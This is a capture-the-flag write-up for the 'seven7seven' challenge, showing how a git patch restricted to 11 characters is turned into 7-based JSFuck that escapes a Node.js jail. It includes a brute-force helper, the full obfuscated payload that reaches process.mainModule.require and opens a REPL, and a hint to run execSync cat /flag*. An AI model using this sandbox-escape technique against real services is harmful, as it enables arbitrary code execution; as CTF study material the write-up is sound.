# seven7seven solve

**the images all look the same so they are boring ish but view whats going on in them pls for understand of the solve**

oh boy ...

## git patch step

the input is a git patch, so lets try and see what a git patch looks like and does. we can generate one by using `git diff`

<img width="745" height="261" alt="image" src="https://github.com/user-attachments/assets/b68c614e-8dc0-4758-82c6-482ffb2312f9" />

we can apply it like so

<img width="702" height="342" alt="image" src="https://github.com/user-attachments/assets/5284bf9d-93ed-43ac-9c6a-32230a261737" />

what if we do it using git stuff to get the filename the same so we can edit `./777`?

<img width="686" height="238" alt="image" src="https://github.com/user-attachments/assets/5f4e0e90-f1f9-4fa9-8b55-b81578d8ecdd" />

it worked!! ok so at this point i just started messing around and removing lines

we can remove the `git diff` beginning line, and the `index whatever..whatever whatever` line too

<img width="708" height="166" alt="image" src="https://github.com/user-attachments/assets/41f1cf49-5312-4c64-97a7-42da890f579f" />

it still works!

at this point i also removed the `a/` and `b/` from before 777

<img width="687" height="162" alt="image" src="https://github.com/user-attachments/assets/71db96a8-a39d-4e46-b5ee-b170d034038c" />

so in the challenge contents it says that there is a restriction on the number of unique characters (11 max). since jsfuck requires `[]()` for sure, thats 4, so 7 other chars can be used

what if we remove the `1` and replace it with a `7`?

<img width="705" height="171" alt="image" src="https://github.com/user-attachments/assets/47f8d855-e4e2-418f-b4f8-bb1677be7461" />

it still works somehow!!! ok so at this point we should look at the git patch source and try to see what options we have for characters if we want to modify the 777 file

the relevant code for that starts [here](https://github.com/git/git/blob/master/apply.c#L4753) (code area can be located using error messages)

<img width="738" height="589" alt="image" src="https://github.com/user-attachments/assets/61ab0517-885a-4860-a173-ab46af8e06ac" />

<img width="866" height="457" alt="image" src="https://github.com/user-attachments/assets/3c0849a1-6305-4de5-9eee-34671d8fde21" />

```c
/*
 * Find file diff header
 *
 * Returns:
 *  -1 if no header was found
 *  -128 in case of error
 *   the size of the header in bytes (called "offset") otherwise
 */
static int find_header(struct apply_state *state,
		       const char *line,
		       unsigned long size,
		       int *hdrsize,
		       struct patch *patch)
{
	unsigned long offset, len;

	patch->is_toplevel_relative = 0;
	patch->is_rename = patch->is_copy = 0;
	patch->is_new = patch->is_delete = -1;
	patch->old_mode = patch->new_mode = 0;
	patch->old_name = patch->new_name = NULL;
	for (offset = 0; size > 0; offset += len, size -= len, line += len, state->linenr++) {
		unsigned long nextlen;

		len = linelen(line, size);
		if (!len)
			break;

		/* Testing this early allows us to take a few shortcuts.. */
		if (len < 6)
			continue;

		/*
		 * Make sure we don't find any unconnected patch fragments.
		 * That's a sign that we didn't find a header, and that a
		 * patch has become corrupted/broken up.
		 */
		if (!memcmp("@@ -", line, 4)) {
			struct fragment dummy;
			if (parse_fragment_header(line, len, &dummy) < 0)
				continue;
			error(_("patch fragment without header at line %d: %.*s"),
				     state->linenr, (int)len-1, line);
			return -128;
		}

		if (size < len + 6)
			break;

		/*
		 * Git patch? It might not have a real patch, just a rename
		 * or mode change, so we handle that specially
		 */
		if (!memcmp("diff --git ", line, 11)) {
			int git_hdr_len = parse_git_diff_header(&state->root, &state->linenr,
								state->p_value, line, len,
								size, patch);
			if (git_hdr_len < 0)
				return -128;
			if (git_hdr_len <= len)
				continue;
			*hdrsize = git_hdr_len;
			return offset;
		}

		/* --- followed by +++ ? */
		if (memcmp("--- ", line,  4) || memcmp("+++ ", line + len, 4))
			continue;

		/*
		 * We only accept unified patches, so we want it to
		 * at least have "@@ -a,b +c,d @@\n", which is 14 chars
		 * minimum ("@@ -0,0 +1 @@\n" is the shortest).
		 */
		nextlen = linelen(line + len, size - len);
		if (size < nextlen + 14 || memcmp("@@ -", line + len + nextlen, 4))
			continue;

		/* Ok, we'll consider it a patch */
		if (parse_traditional_patch(state, line, line+len, patch))
			return -128;
		*hdrsize = len + nextlen;
		state->linenr += 2;
		return offset;
	}
	return -1;
}
```

ok the furthest i was able to go with it (lowest unique chars count) was this

```
--- 777
+++ 777
@@ -7 +7 @@
-777
+payload
```

## jsfuck exploration step

so since it is jsfuck, `+` is pretty useful, `-` is less useful, space even less useful (only useful for unary plus expr on right side of add expr), `@` is completely useless unfortunately

we need `!+- @7` at least for sure. this is 6 chars. for jsfuck we need `[]()` for sure, so thats 10 total. we have one char left

traditionally jsfuck uses `![]()+`, but `!` isnt allowed here since it's replaced with `\n`. instead, there are three other characters we can use that also work to provide the complete functionality
of jsfuck. its either `=` or `<` or `>` (im sorry but this is left as an exercise to the reader on how the other two work because i am really tired rn (jk i found screenshot)).

here is `>` (you can do comparison and right shift)

<img width="503" height="729" alt="image" src="https://github.com/user-attachments/assets/62cd0e8d-0532-4be8-a9c5-cca603c236e9" />

but with `=` it is also possible (you can do `==` comparison and setting variables (yay!!!))

<img width="515" height="532" alt="image" src="https://github.com/user-attachments/assets/3cfa5d64-24f0-42f7-add9-31b52d3f89b2" />

since this challenge has a very very low character limit, we go with `=` to maximize compression capabilities. it is proven that we can do everything normal jsfuck can in the following ways:

so the entire idea is we have to use the number 7, jsfuck, and recursive substitution (similar to sequitur algo but also sort of completely different (?)) to compress this payload like crazy

the overall idea is we want to overwrite `7["constructor"]["prototype"][val]` so that we can just do `7[val]` to access it several times. this is a major benefit of choosing `=` as the last char.

(epic javascript moment that is unrelated somewhat)

<img width="453" height="481" alt="image" src="https://github.com/user-attachments/assets/02f2a067-f045-4f12-9bfa-8c1fb5b7dddc" />

so to recap once we speedrun something like `7['constructor']['prototype'][smth]=7['constructor']['prototype']` (i call it protosub) we can do `7[smth][val]=smth_else` to "set variables" on the proto with something else and do `7[val]` to retrieve that something else very compactly

but ... its kind of chunky

the hardest part is getting the letter `p` for prototype, which the `old-solve.py` took like 4000 chars just to set up protosub because `p` is gigantasaurus (... orange ...)

however, we can do another technique i call atsub compression where we use `[]['at']` which is the same between different instances of `[]` since i think it is attached to the numbers proto but binded to `[]` or something like that (idk) (?) (?) idk maybe

getting `[]['at']` is fairly easy in this type of jsfuck (it is `"[][((7==77)+[])[+(7==7)]+((7==7)+[])[7-7]]"`)

so like `[]['at'][7]='constructor'` and then use `[]['at'][7]` to get 'constructor'. i feel like its more efficient to go for the atsub into protosub but i havent tested it with only atsub maybe its less idk

one thing that is important is doing atsub firsts and atsub first table where like you have `[a=b][a+a+a idk more usages of a to get shell]` but what we can do instead is something like `(a=b)+a+a idk more usages of a to get shell` and remove the extra usage since atsub takes a lot lot lot of characters (i should have applied this to protosub as well but its a bit annoying to impl)

so once we speedrun getting protosub capabilities, we do some automated golfing ... (will be discussed briefly just keep reading)

basically we want to make it as easy as possible to get out of this jail. we dont want to use obscure chars like `@` since those are really really hard to get in jsfuck, stuff like that.

the easiest way i found to get to require for importing modules was `Function('return process')()['mainModule']['require']`.

there are still some weird to get chars tho ... but there is a solution!

we can use btoa and atob abuse to get complex chars from simple chars, here is the brute force segment i wrote to do that

```js
# bruting btoa
store_btoa = {}
for a in subst_letters:
    for b in subst_letters:
        for c in subst_letters:
            for char in b64encode((a+b+c).encode()).decode():
                if char not in store_btoa or len(conjure(store_btoa[char])) > len(conjure(a+b+c)):
                    store_btoa[char] = a+b+c
        for char in b64encode((a+b).encode()).decode():
            if char not in store_btoa or len(conjure(store_btoa[char])) > len(conjure(a+b)):
                store_btoa[char] = a+b
    for char in b64encode((a).encode()).decode():
        if char not in store_btoa or len(conjure(store_btoa[char])) > len(conjure(a)):
            store_btoa[char] = a
# bruting atob
store_atob = {}
subst_letters_clean = [c for c in subst_letters if c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"]
for a in subst_letters_clean:
    for b in subst_letters_clean:
        for c in subst_letters_clean:
            for d in subst_letters_clean:
                for char in b64decode((a+b+c+d).encode()).decode('latin-1'):
                    if char not in store_atob or len(conjure(store_atob[char])) > len(conjure(a+b+c+d)):
                        store_atob[char] = a+b+c+d
            for char in b64decode((a+b+c+'=').encode()).decode('latin-1'):
                if char not in store_atob or len(conjure(store_atob[char])) > len(conjure(a+b+c)):
                    store_atob[char] = a+b+c
        for char in b64decode((a+b + '==').encode()).decode('latin-1'):
            if char not in store_atob or len(conjure(store_atob[char])) > len(conjure(a+b)):
                store_atob[char] = a+b
```

since we are using btoa and atob for most chars, we can end up using protosub to get those complex chars really quickly since btoa and atob are right at our fingertips

so in terms of the js module

## jsfuck protosub golfing step

i did this sort of similar to my highly obscure ictf round 40 (?) challenge 6 char cryptojail (NOT CRYPTO THEY FORCED ME INTO WRITING CRYPTO IN THE NAME BC "CRYPTO MONTH", WTF ETH), where you have to use the `this` object and substitution to golf a fetch(webhook site smth) to like 600 chars only. however there were unintendeds, and also the solve script is so garbage tier that i feel like it would be a massive red herring so i am probably not going to say anything unless no one gets it in 48hr and i feel like i need to drop a hint ...

the way i did protosub automatically (very very compact compared to manual btw) is i analyzed the giant ast with no protosub so like all of the atobs and btoas and literally all the garbage was expanded, and i checked each subtree to see what the exact char count would be if i substituted it. i then did protosub on the best option and did this until there were no options left. i know this is not ideal since it is a greedy alg, but this should be pretty good

if i had to do it again i would make it recursive dfs for like a depth of around 3-4 and then use greed alg for the rest of the way on each tree and then choose the best one of all of the trees since like theres no way greedy alg fails on the easy steps right??? i hope not

um i guess one issue i had is that i cant substitute out the `to` in `atob`,`btoa`,`constructor` since the way the ast is set up it is like `((a+t)+o)+b` or something and its super annoying to handle sadly

i guess i also set up a way to hash the trees and do memoization since its super computationally expensive to compare two trees and like compute their length every time i want to see its length

the by far most annoying thing is that the esprima python module doesnt have a way to traverse the tree structure so i have to write my own. luckily its simple since its only a few node types but it took some hours to set up everything because of this

## overall

my commentary and writeup sucks im sorry i cant explain it well hopefully someone on chr(sum(range(dont(remember(the(rest(())))))))))))) solves it or maybe tchen (?) or arkark (?) and makes a better writeup

here is the payload

```
--- 777!+++ 777!@@ -7 +7 @@!-777!+[[[[[[[[[[[7[([][((7==77)+[])[+(7==7)]+((7==7)+[])[7-7]][7]=(7777+[][(777777+[7==77])[7]+((7==7)+[])[+[]]])[7]+(7+[][(777777+[7==77])[7]+((7==7)+[])[+[]]])[7]+([7]+7[7])[7]+((7==7)+[7==77])[7]+((7==7)+[])[+[]]+(777777+[7==7])[7]+(7[7]+[])[+[]]+(7777+[][(777777+[7==77])[7]+((7==7)+[])[+[]]])[7]+((7==7)+[])[+[]]+(7+[][(777777+[7==77])[7]+((7==7)+[])[+[]]])[7]+(777777+[7==7])[7])][([][((7==77)+[])[+(7==7)]+((7==7)+[])[7-7]][[]]=([][((7==77)+[])[+(7==7)]+((7==7)+[])[7-7]][77]=(7777)[((7==7)+[])[+[]]+(7+[][(777777+[7==77])[7]+((7==7)+[])[+[]]])[7]+(7+[])[[][((7==77)+[])[+(7==7)]+((7==7)+[])[7-7]][7]][([7]+7[7])[7]+(777777+[7==77])[7]+((+[])[[][((7==77)+[])[+(7==7)]+((7==7)+[])[7-7]][7]]+[])[+(7==7)+[]+ +(7==7)]+([]+7[7])[7]]](7+7+7+7)[+(7==7)])+(777777+[7==7])[7]+(7+[][(777777+[7==77])[7]+((7==7)+[])[+[]]])[7]+((7==7)+[])[+[]]+(7+[][(777777+[7==77])[7]+((7==7)+[])[+[]]])[7]+((7==7)+[])[+[]]+(+(7+([]+7[7])[7]+7+7+7)+[])[7]+[][((7==77)+[])[+(7==7)]+((7==7)+[])[7-7]][77]+([]+7[7])[7])][7+[-7]]=7[[][((7==77)+[])[+(7==7)]+((7==7)+[])[7-7]][7]][[][((7==77)+[])[+(7==7)]+((7==7)+[])[7-7]][[]]]][7[7+[-7]][[]]=[][((7==77)+[])[+(7==7)]+((7==7)+[])[7-7]]]][7[7+[-7]][-77]=(777777+[7==7])[7]]][7[7+[-7]][7+7]=((7==7)+[])[+[]]]][7[7+[-7]][-777]=([]+7[7])[7]]][7[7+[-7]][-7]=7[-77]+7[-777]+7[7+7]+(7[7]+[])[+[]]+7[-77]+([7]+7[7])[7]+([]+[][7[[]][7]])[7+(7==7)]]][7[7+[-7]][7-77]=((7==7)+[7==77])[7]]][7[7+[-7]][77]=([][7[-777]+([7]+7[7])[7]+7[7+7]+7[-77]+([77]+7[7])[7]+7[-777]+7[7-77]]()+[])[(7==7)+(7==7)]]][7[7+[-7]][777]=(777777+[7==77])[7]]][7[7+[-7]][77-7]=(7+[][7[[]][7]])[7]]][7[7+[-7]][7+77]=[][7[[]][7]][7[[]][7]]]][7[7+77](7[-7]+7[[]][77]+7[-77]+7[77-7]+(7777+[][7[777]+7[7+7]])[7]+7[-777]+7[7-77]+7[7-77])()[((+[])[7[[]][7]]+[])[+(7==7)+[]+ +(7==7)]+7[777]+([77]+7[7])[7]+([7]+7[7])[7]+7[7+77](7[-7]+7[77]+7[7+7]+7[77-7]+7[777])()(+[]+[])[+[]]+7[77-7]+([7==77]+7[7])[7]+(7[7]+[])[+[]]+((7==77)+[7==77])[7]+7[-777]][7[-77]+7[-777]+7[7+77](7[-7]+7[777]+7[7+7]+7[77-7]+7[77])()((7777+[][7[777]+7[7+7]])[7]+7[-777])[+[]]+(7[7]+[])[+[]]+([77]+7[7])[7]+7[-77]+7[-777]](7[-77]+7[-777]+7[[]][77]+((7==77)+[7==77])[7])[7[7-77]+7[7+7]+7[777]+7[-77]+7[7+7]]()]!
```

here is it working

```
quasar@quasar098:~/<REDACTED>/seven7seven/solve$ cat payload.txt - | node ../handout/index.js
good luck > --- 777!+++ 777!@@ -7 +7 @@!-777!+[[[[[[[[[[[7[([][((7==77)+[])[+(7==7)]+((7==7)+[])[7-7]][7]=(7777+[][(777777+[7==77])[7]+((7==7)+[])[+[]]])[7]+(7+[][(777777+[7==77])[7]+((7==7)+[])[+[]]])[7]+([7]+7[7])[7]+((7==7)+[7==77])[7]+((7==7)+[])[+[]]+(777777+[7==7])[7]+(7[7]+[])[+[]]+(7777+[][(777777+[7==77])[7]+((7==7)+[])[+[]]])[7]+((7==7)+[])[+[]]+(7+[][(777777+[7==77])[7]+((7==7)+[])[+[]]])[7]+(777777+[7==7])[7])][([][((7==77)+[])[+(7==7)]+((7==7)+[])[7-7]][[]]=([][((7==77)+[])[+(7==7)]+((7==7)+[])[7-7]][77]=(7777)[((7==7)+[])[+[]]+(7+[][(777777+[7==77])[7]+((7==7)+[])[+[]]])[7]+(7+[])[[][((7==77)+[])[+(7==7)]+((7==7)+[])[7-7]][7]][([7]+7[7])[7]+(777777+[7==77])[7]+((+[])[[][((7==77)+[])[+(7==7)]+((7==7)+[])[7-7]][7]]+[])[+(7==7)+[]+ +(7==7)]+([]+7[7])[7]]](7+7+7+7)[+(7==7)])+(777777+[7==7])[7]+(7+[][(777777+[7==77])[7]+((7==7)+[])[+[]]])[7]+((7==7)+[])[+[]]+(7+[][(777777+[7==77])[7]+((7==7)+[])[+[]]])[7]+((7==7)+[])[+[]]+(+(7+([]+7[7])[7]+7+7+7)+[])[7]+[][((7==77)+[])[+(7==7)]+((7==7)+[])[7-7]][77]+([]+7[7])[7])][7+[-7]]=7[[][((7==77)+[])[+(7==7)]+((7==7)+[])[7-7]][7]][[][((7==77)+[])[+(7==7)]+((7==7)+[])[7-7]][[]]]][7[7+[-7]][[]]=[][((7==77)+[])[+(7==7)]+((7==7)+[])[7-7]]]][7[7+[-7]][-77]=(777777+[7==7])[7]]][7[7+[-7]][7+7]=((7==7)+[])[+[]]]][7[7+[-7]][-777]=([]+7[7])[7]]][7[7+[-7]][-7]=7[-77]+7[-777]+7[7+7]+(7[7]+[])[+[]]+7[-77]+([7]+7[7])[7]+([]+[][7[[]][7]])[7+(7==7)]]][7[7+[-7]][7-77]=((7==7)+[7==77])[7]]][7[7+[-7]][77]=([][7[-777]+([7]+7[7])[7]+7[7+7]+7[-77]+([77]+7[7])[7]+7[-777]+7[7-77]]()+[])[(7==7)+(7==7)]]][7[7+[-7]][777]=(777777+[7==77])[7]]][7[7+[-7]][77-7]=(7+[][7[[]][7]])[7]]][7[7+[-7]][7+77]=[][7[[]][7]][7[[]][7]]]][7[7+77](7[-7]+7[[]][77]+7[-77]+7[77-7]+(7777+[][7[777]+7[7+7]])[7]+7[-777]+7[7-77]+7[7-77])()[((+[])[7[[]][7]]+[])[+(7==7)+[]+ +(7==7)]+7[777]+([77]+7[7])[7]+([7]+7[7])[7]+7[7+77](7[-7]+7[77]+7[7+7]+7[77-7]+7[777])()(+[]+[])[+[]]+7[77-7]+([7==77]+7[7])[7]+(7[7]+[])[+[]]+((7==77)+[7==77])[7]+7[-777]][7[-77]+7[-777]+7[7+77](7[-7]+7[777]+7[7+7]+7[77-7]+7[77])()((7777+[][7[777]+7[7+7]])[7]+7[-777])[+[]]+(7[7]+[])[+[]]+([77]+7[7])[7]+7[-77]+7[-777]](7[-77]+7[-777]+7[[]][77]+((7==77)+[7==77])[7])[7[7-77]+7[7+7]+7[777]+7[-77]+7[7+7]]()]!
running
> js repl lmao
jjSs  rrll mmaaoo

js repl lmao
   ^^^^

Uncaught SyntaxError: Unexpected identifier 'repl'
> ^C
```

you also only have 4 seconds to input the execSync cat /flag* js code so beware of that i guess
